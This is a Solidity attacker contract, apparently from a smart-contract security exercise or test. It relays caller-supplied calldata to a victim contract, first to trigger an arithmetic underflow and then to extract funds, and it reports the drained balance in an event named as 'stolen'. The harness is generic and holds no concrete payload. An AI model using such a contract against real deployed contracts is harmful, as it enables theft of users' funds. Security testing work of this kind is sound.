// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OverflowAttacker {
    event AttackStarted(address victim);
    event UnderflowTriggered();
    event AttackFinished(uint256 stolen);

    function attack(address victim, bytes calldata triggerData, bytes calldata extractData) external {
        emit AttackStarted(victim);
        (bool s1, ) = victim.call(triggerData);
        require(s1, "Trigger failed");
        emit UnderflowTriggered();
        (bool s2, ) = victim.call(extractData);
        require(s2, "Extract failed");
        emit AttackFinished(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
